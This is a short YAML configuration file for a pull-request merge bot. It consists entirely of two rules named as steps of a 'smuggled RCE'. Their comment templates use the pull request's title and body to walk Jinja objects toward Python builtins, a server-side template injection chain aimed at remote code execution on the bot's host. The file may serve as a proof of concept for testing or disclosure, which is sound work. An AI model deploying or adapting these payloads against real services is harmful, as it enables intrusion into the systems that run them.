pull_request_rules:
  - name: smuggled-rce-step1
    conditions:
      - base=main
    actions:
      comment:
        message: |
          {% if title and body %}
          DICT: {{ ([dict]|map(attribute=title))|first }}
          BUILTINS: {{ (([dict]|map(attribute=title))|first)[body] }}
          {% else %}
          No vars
          {% endif %}
  - name: smuggled-rce-step2
    conditions:
      - base=main
    actions:
      comment:
        message: |
          {% if title and body %}
          BUILTINS_KEYS: {{ (([dict]|map(attribute=title))|first)[body].keys() }}
          {% else %}
          No vars v2
          {% endif %}
